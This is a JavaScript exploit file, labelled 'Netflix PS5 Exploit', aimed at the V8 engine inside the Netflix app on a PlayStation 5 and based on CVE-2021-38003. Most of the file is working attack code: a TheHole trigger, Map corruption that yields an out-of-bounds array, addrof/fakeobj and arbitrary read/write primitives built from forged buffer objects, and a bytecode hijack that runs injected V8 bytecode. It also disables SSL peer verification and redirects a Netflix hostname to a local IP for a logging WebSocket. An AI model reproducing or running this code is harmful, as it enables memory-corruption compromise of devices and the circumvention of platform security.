// Netflix PS5 Exploit
// based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
// thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html

// #region WebSocket
const ws = {
    socket: null,
    init(ip, port, callback) {
        nrdp.gibbon._runConsole("/command ssl-peer-verification false");

        nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
            addresses: [ip],
            ttl: 3600000
        });

        this.socket = new nrdp.WebSocket(`wss://pwn.netflix.com:${port}`);
        this.socket.onopen = callback;
    },
    send(msg) {
        if (this.socket && this.socket.readyState !== this.socket.CLOSED) {
            this.socket.send(msg);
        }
    }
}
// #endregion
// #region Logger
const logger = {
    overlay: null,
    lines: [],
    maxLines: 40,
    refreshTimer: null,
    init() {
        this.overlay = nrdp.gibbon.makeWidget({
            name: "dbg",
            width: 1280,
            height: 720,
            backgroundColor: "#000000"
        });
    
        nrdp.gibbon.scene.overlay = this.overlay;
    },
    log(msg) {
        ws.send(msg);
        this.lines.push(msg);
        if (this.lines.length > this.maxLines) this.lines.shift();
        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
        this.refreshTimer = nrdp.setTimeout(() => {
            this.refresh();
            this.refreshTimer = null;
        }, 50);
    },
    refresh() {
        if (!this.overlay) return;
        if (this.overlay.children) {
            for (var j = this.overlay.children.length - 1; j >= 0; j--) {
                var child = this.overlay.children[j];
                if (child && child._name && child._name.startsWith("ln")) {
                    this.overlay.removeChild(child);
                }
            }
        }

        for (var i = 0; i < this.lines.length; i++) {
            var w = nrdp.gibbon.makeWidget({
                name: "ln" + i,
                x: 10,
                y: 10 + (i * 17),
                width: 1260,
                height: 15
            });
            
            w.text = {
                contents: this.lines[i],
                size: 12,
                color: {
                    a: 255,
                    r: 0,
                    g: 255,
                    b: 0
                },
                wrap: false
            };

            w.parent = this.overlay;
        }
    }
}
// #endregion
// #region Pointer Helpers
const buf = new ArrayBuffer(8);
const view = new DataView(buf);
const ptr = {
    il2ih(value) {
        return value << 0x20n;
    },
    ih2il(value) {
        return value >> 0x20n;
    },
    ih(value) {
        return value & ~0xFFFFFFFFn;
    },
    il(value) {
        return value & 0xFFFFFFFFn;
    },
    itag(value) {
    	return value | 1n;
    },
    iuntag(value) {
    	return value & ~1n;
    },
    f2i(value) {
        view.setFloat64(0, value, true);
        return view.getBigUint64(0, true);
    },
    f2ih(value) {
        view.setFloat64(0, value, true);
        return BigInt(view.getUint32(4, true));
    },
    f2il(value) {
        view.setFloat64(0, value, true);
        return BigInt(view.getUint32(0, true));
    },
    i2f(value) {
        view.setBigUint64(0, value, true);
        return view.getFloat64(0, true);
    },
    i2h(value, padded = true) {
        let str = value.toString(16).toUpperCase();
        if (padded) {
            str = str.padStart(16, '0');
        }
        return `0x${str}`;
    }
}
// #endregion
// #region Primitives
let map, oob_arr, flt_arr, obj_arr;
const rw = {
    flt_elem_index: 7,
    obj_elem_index: 14,
    flt_elem: 0,
    obj_elem: 0,
    init() {
        let hole = this.make_hole();

        map = new Map();
        map.set(1, 1);
        map.set(hole, 1);
        map.delete(hole);
        map.delete(hole);
        map.delete(1);

        oob_arr = new Array(1.1, 1.1);
        flt_arr = [2.2];
        obj_arr = [{}];

        logger.log(`OOB array length: ${oob_arr.length}`);

        map.set(0x10, -1);
        map.set(oob_arr, 0x100);

        logger.log("Achieved OOB !!");

        logger.log(`OOB array length: ${oob_arr.length}`);

        this.flt_elem = ptr.f2i(oob_arr[this.flt_elem_index]);
        this.obj_elem = ptr.f2i(oob_arr[this.obj_elem_index]);
    },
    addrof(obj) {
        oob_arr[this.obj_elem_index] = ptr.i2f(this.obj_elem);
        obj_arr[0] = obj;
        oob_arr[this.flt_elem_index] = ptr.i2f(this.obj_elem);
        return ptr.iuntag(ptr.f2il(flt_arr[0]));
    },
    fakeobj(addr) {
        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
        flt_arr[0] = ptr.i2f(ptr.ih(ptr.f2i(flt_arr[0])) | ptr.il(ptr.itag(addr)));
        oob_arr[this.obj_elem_index] = ptr.i2f(this.flt_elem);
        return obj_arr[0];
    },
    read(addr, untag = false) {
        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
        let value = ptr.f2i(flt_arr[0]);
        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
        return untag ? ptr.iuntag(value) : value;
    },
    write(addr, value, untag = false) {
        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
        flt_arr[0] = ptr.i2f(untag ? ptr.iuntag(value) : value);
        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
    },
    read32(addr, untag = false) {
        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
        let value = ptr.il(ptr.f2i(flt_arr[0]));
        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
        return untag ? ptr.iuntag(value) : value;
    },
    write32(addr, value, untag = false) {
        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
        flt_arr[0] = ptr.i2f(ptr.ih(ptr.f2i(flt_arr[0])) | ptr.il(untag ? ptr.iuntag(value) : value));
        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
    },
    make_hole() {
        let v1;
        function f0(v4) {
            v4(() => { }, v5 => {
                v1 = v5.errors;
            });
        }
        f0.resolve = function (v6) {
            return v6;
        };
        let v3 = {
            then(v7, v8) {
                v8();
            }
        };
        Promise.any.call(f0, [v3]);
        return v1[1];
    },
    make_hole_old() {
        let a = [], b = [];
        let s = '"'.repeat(0x800000);
        a[20000] = s;

        for (let i = 0; i < 10; i++) a[i] = s;
        for (let i = 0; i < 10; i++) b[i] = a;

        try {
            JSON.stringify(b);
        } catch (hole) {
            return hole;
        }
    
        throw new Error('Could not trigger TheHole');
    }
}
// #endregion
// #region Arbitrary Primitives
let lo_arr, lo_view;
const arw = {
    isolate: 0n,
    base_addr: 0n,
    fake_buf_addr: 0n,
    fake_view_addr: 0n,
    fake_buf_index: 0x10,
    fake_view_index: 0x20,
    fake_bytecode_index: 0x80,
    fake_bytecode_size: 0x200n,
    lo_arr_data_ptr_addr: 0n,
    lo_arr_backing_store_addr: 0n,
    init() {
        let arr = new Uint8Array(0x40);
        let arr_addr = rw.addrof(arr);

        this.isolate = ptr.ih(rw.read(arr_addr + 0x28n));

        if (this.isolate == 0n) {
            throw new Error("Isolate is zero, exiting...");
        }
        
        lo_arr = new Array(0x20001);
        lo_view = new DataView(new ArrayBuffer(8));

        lo_arr_addr = rw.addrof(lo_arr);
        lo_view_addr = rw.addrof(lo_view);
        lo_view_buf_addr = rw.addrof(lo_view.buffer);

        this.lo_arr_backing_store_addr = rw.read32(lo_arr_addr + 0x8n, true);
        this.lo_arr_data_ptr_addr = this.lo_arr_backing_store_addr + 0x8n;

        rw.write(lo_view_addr + 0x18n, 0x20001n);
        rw.write(lo_view_buf_addr + 0x14n, this.lo_arr_data_ptr_addr + this.isolate);

        this.make_fake_buf();
        this.make_fake_view();

        logger.log("Achieved ARW !!");

        let fake_view = this.fakeobj(this.fake_view_addr);

        logger.log(`fake view length: ${fake_view.byteLength}`);

        this.base_addr = this.view(this.isolate, 0n, -1n, false).getBigUint64(0x28, true) - 0x896EE8n;
    },
    addrof(obj) {
        lo_arr[0] = obj;
        return ptr.iuntag(BigInt(lo_view.getUint32(0, true)));
    },
    fakeobj(addr) {
        lo_view.setUint32(0, Number(ptr.itag(ptr.il(addr))), true);
        return lo_arr[0];
    },
    read(addr, untag = false) {
        let value = arw.view(addr).getBigUint64(0, true);
        return untag ? ptr.iuntag(value) : value;
    },
    write(addr, value, untag = false) {
        arw.view(addr).setBigUint64(0, untag ? ptr.iuntag(value) : value, true);
    },
    read32(addr, untag = false) {
        let value = BigInt(arw.view(addr).getUint32(0, true));
        return untag ? ptr.iuntag(value) : value;
    },
    write32(addr, value, untag = false) {
        arw.view(addr).setUint32(0, Number(untag ? ptr.iuntag(value) : value), true);
    },
    /** @return {DataView<ArrayBuffer>} */
    view(addr, offset = 0n, size = -1n, isolated = true) {
        lo_view.setBigUint64((4 * this.fake_buf_index) + 0x14, ptr.iuntag(isolated ? addr + this.isolate : addr), true);
        lo_view.setBigUint64((4 * this.fake_view_index) + 0x10, BigInt(offset), true);
        lo_view.setBigUint64((4 * this.fake_view_index) + 0x18, BigInt(size), true);
        return this.fakeobj(this.fake_view_addr);
    },
    /** @return {DataView<ArrayBuffer>} */
    fake_bytecode() {
        return this.view(this.fake_bytecode_addr(), 0n, this.fake_bytecode_size);
    },
    fake_bytecode_addr() {
        return this.lo_arr_data_ptr_addr + BigInt(4 * this.fake_bytecode_index);
    },
    make_fake_buf() {
        let buf = new ArrayBuffer(8);
        let buf_addr = this.addrof(buf);
        
        let i = this.fake_buf_index;
        lo_view.setUint32(4 * i++, Number(rw.read32(buf_addr)), true);
        lo_view.setUint32(4 * i++, Number(rw.read32(buf_addr + 0x4n)), true);
        lo_view.setUint32(4 * i++, Number(rw.read32(buf_addr + 0x8n)), true);
        lo_view.setBigUint64(4 * i++, 0x1000n, true);
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true); // backing_store
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;
        lo_view.setUint32(4 * i++, 2, true);
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++

        this.fake_buf_addr = this.lo_arr_data_ptr_addr + BigInt(4 * this.fake_buf_index);
    },
    make_fake_view() {
        let buf = this.fakeobj(this.fake_buf_addr);

        let view = new DataView(buf);
        let view_addr = this.addrof(view);

        let i = this.fake_view_index;
        lo_view.setUint32(4 * i++, Number(rw.read32(view_addr)), true);
        lo_view.setUint32(4 * i++,  Number(rw.read32(view_addr + 0x4n)), true);
        lo_view.setUint32(4 * i++,  Number(rw.read32(view_addr + 0x8n)), true);
        lo_view.setUint32(4 * i++,  Number(rw.read32(view_addr + 0xCn)), true);
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;
        lo_view.setBigUint64(4 * i++, -1n, true);
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;

        this.fake_view_addr = this.lo_arr_data_ptr_addr + BigInt(4 * this.fake_view_index);
    }
}
// #endregion
// #region ROP
const rop = {
    index: 0,
    bytecode_age_index: 0x21,
    bytecode_size_index: 0x4,
    bytecode_frame_index: 0x14,
    bytecode_start_index: 0x22,
    bytecodes: Object.freeze({
        Wide: 0,
        ExtraWide: 1,
        DebugBreakWide: 2,
        DebugBreakExtraWide: 3,
        DebugBreak0: 4,
        DebugBreak1: 5,
        DebugBreak2: 6,
        DebugBreak3: 7,
        DebugBreak4: 8,
        DebugBreak5: 9,
        DebugBreak6: 10,
        LdaZero: 11,
        LdaSmi: 12,
        LdaUndefined: 13,
        LdaNull: 14,
        LdaTheHole: 15,
        LdaTrue: 16,
        LdaFalse: 17,
        LdaConstant: 18,
        LdaGlobal: 19,
        LdaGlobalInsideTypeof: 20,
        StaGlobal: 21,
        PushContext: 22,
        PopContext: 23,
        LdaContextSlot: 24,
        LdaImmutableContextSlot: 25,
        LdaCurrentContextSlot: 26,
        LdaImmutableCurrentContextSlot: 27,
        StaContextSlot: 28,
        StaCurrentContextSlot: 29,
        LdaLookupSlot: 30,
        LdaLookupContextSlot: 31,
        LdaLookupGlobalSlot: 32,
        LdaLookupSlotInsideTypeof: 33,
        LdaLookupContextSlotInsideTypeof: 34,
        LdaLookupGlobalSlotInsideTypeof: 35,
        StaLookupSlot: 36,
        Ldar: 37,
        Star: 38,
        Mov: 39,
        LdaNamedProperty: 40,
        LdaNamedPropertyNoFeedback: 41,
        LdaNamedPropertyFromSuper: 42,
        LdaKeyedProperty: 43,
        LdaModuleVariable: 44,
        StaModuleVariable: 45,
        StaNamedProperty: 46,
        StaNamedPropertyNoFeedback: 47,
        StaNamedOwnProperty: 48,
        StaKeyedProperty: 49,
        StaInArrayLiteral: 50,
        StaDataPropertyInLiteral: 51,
        CollectTypeProfile: 52,
        Add: 53,
        Sub: 54,
        Mul: 55,
        Div: 56,
        Mod: 57,
        Exp: 58,
        BitwiseOr: 59,
        BitwiseXor: 60,
        BitwiseAnd: 61,
        ShiftLeft: 62,
        ShiftRight: 63,
        ShiftRightLogical: 64,
        AddSmi: 65,
        SubSmi: 66,
        MulSmi: 67,
        DivSmi: 68,
        ModSmi: 69,
        ExpSmi: 70,
        BitwiseOrSmi: 71,
        BitwiseXorSmi: 72,
        BitwiseAndSmi: 73,
        ShiftLeftSmi: 74,
        ShiftRightSmi: 75,
        ShiftRightLogicalSmi: 76,
        Inc: 77,
        Dec: 78,
        Negate: 79,
        BitwiseNot: 80,
        ToBooleanLogicalNot: 81,
        LogicalNot: 82,
        TypeOf: 83,
        DeletePropertyStrict: 84,
        DeletePropertySloppy: 85,
        GetSuperConstructor: 86,
        CallAnyReceiver: 87,
        CallProperty: 88,
        CallProperty0: 89,
        CallProperty1: 90,
        CallProperty2: 91,
        CallUndefinedReceiver: 92,
        CallUndefinedReceiver0: 93,
        CallUndefinedReceiver1: 94,
        CallUndefinedReceiver2: 95,
        CallNoFeedback: 96,
        CallWithSpread: 97,
        CallRuntime: 98,
        CallRuntimeForPair: 99,
        CallJSRuntime: 100,
        InvokeIntrinsic: 101,
        Construct: 102,
        ConstructWithSpread: 103,
        TestEqual: 104,
        TestEqualStrict: 105,
        TestLessThan: 106,
        TestGreaterThan: 107,
        TestLessThanOrEqual: 108,
        TestGreaterThanOrEqual: 109,
        TestReferenceEqual: 110,
        TestInstanceOf: 111,
        TestIn: 112,
        TestUndetectable: 113,
        TestNull: 114,
        TestUndefined: 115,
        TestTypeOf: 116,
        ToName: 117,
        ToNumber: 118,
        ToNumeric: 119,
        ToObject: 120,
        ToString: 121,
        CreateRegExpLiteral: 122,
        CreateArrayLiteral: 123,
        CreateArrayFromIterable: 124,
        CreateEmptyArrayLiteral: 125,
        CreateObjectLiteral: 126,
        CreateEmptyObjectLiteral: 127,
        CloneObject: 128,
        GetTemplateObject: 129,
        CreateClosure: 130,
        CreateBlockContext: 131,
        CreateCatchContext: 132,
        CreateFunctionContext: 133,
        CreateEvalContext: 134,
        CreateWithContext: 135,
        CreateMappedArguments: 136,
        CreateUnmappedArguments: 137,
        CreateRestParameter: 138,
        JumpLoop: 139,
        Jump: 140,
        JumpConstant: 141,
        JumpIfNullConstant: 142,
        JumpIfNotNullConstant: 143,
        JumpIfUndefinedConstant: 144,
        JumpIfNotUndefinedConstant: 145,
        JumpIfUndefinedOrNullConstant: 146,
        JumpIfTrueConstant: 147,
        JumpIfFalseConstant: 148,
        JumpIfJSReceiverConstant: 149,
        JumpIfToBooleanTrueConstant: 150,
        JumpIfToBooleanFalseConstant: 151,
        JumpIfToBooleanTrue: 152,
        JumpIfToBooleanFalse: 153,
        JumpIfTrue: 154,
        JumpIfFalse: 155,
        JumpIfNull: 156,
        JumpIfNotNull: 157,
        JumpIfUndefined: 158,
        JumpIfNotUndefined: 159,
        JumpIfUndefinedOrNull: 160,
        JumpIfJSReceiver: 161,
        SwitchOnSmiNoFeedback: 162,
        ForInEnumerate: 163,
        ForInPrepare: 164,
        ForInContinue: 165,
        ForInNext: 166,
        ForInStep: 167,
        SetPendingMessage: 168,
        Throw: 169,
        ReThrow: 170,
        Return: 171,
        ThrowReferenceErrorIfHole: 172,
        ThrowSuperNotCalledIfHole: 173,
        ThrowSuperAlreadyCalledIfNotHole: 174,
        ThrowIfNotSuperConstructor: 175,
        SwitchOnGeneratorState: 176,
        SuspendGenerator: 177,
        ResumeGenerator: 178,
        GetIterator: 179,
        Debugger: 180,
        IncBlockCounter: 181,
        Abort: 182
    }),
    init() {
        this.pwn(0);

        let pwn_addr = arw.addrof(this.pwn);
        let shared_function_info = arw.read32(pwn_addr + 0xCn, true);
        let function_data = arw.read32(shared_function_info + 0x4n, true);

        for (var i = 0; i < this.bytecode_start_index; i++) {
            let b = arw.view(function_data).getUint8(i);
            arw.fake_bytecode().setUint8(i, b);
        }

        arw.fake_bytecode().setUint32(this.bytecode_frame_index, 0x200, true);

        arw.write32(shared_function_info + 0x4n, ptr.itag(arw.fake_bytecode_addr()));

        logger.log("Achieved ROP !!");
    },
    emit(inst) {
        let value = 0;
        switch(typeof inst) {
            case "string":
                if (inst in this.bytecodes) {
                    value = this.bytecodes[inst];
                }
                break;
            case "number":
                value = inst;
                break;
        }

        arw.fake_bytecode().setUint8(this.bytecode_start_index + this.index++, value);
    },
    reset() {
        this.index = 0;
    },
    exec(x = 0) {
        arw.fake_bytecode().setUint32(this.bytecode_size_index, this.index << 1, true);
        arw.fake_bytecode().setUint8(this.bytecode_age_index, 0, true);

        let value = this.pwn(x);
        this.reset();
        
        return value;
    },
    pwn(x) {
        return x + 1;
    }
}
// #endregion

function main() {
    logger.init();
    logger.log("=== Netflix n Hack ===");

    rw.init();
    arw.init();
    rop.init();

    rop.emit("Ldar");
    rop.emit(0);
    rop.emit("Return");
    
    let value = rop.exec();
    logger.log(`Ldar 0, ret: ${value}`);

    rop.emit("LdaUndefined");
    rop.emit("Return");
    
    value = rop.exec();
    logger.log(`LdaUndefined, ret: ${value}`);

    rop.emit("LdaTrue");
    rop.emit("Return");
    
    value = rop.exec();
    logger.log(`LdaTrue, ret: ${value}`);

    rop.emit("LdaZero");
    rop.emit("Return");
    
    value = rop.exec();
    logger.log(`LdaZero, ret: ${value}`);

    //while (true) {}
}

ws.init("192.168.1.2", 1337, main);
//main();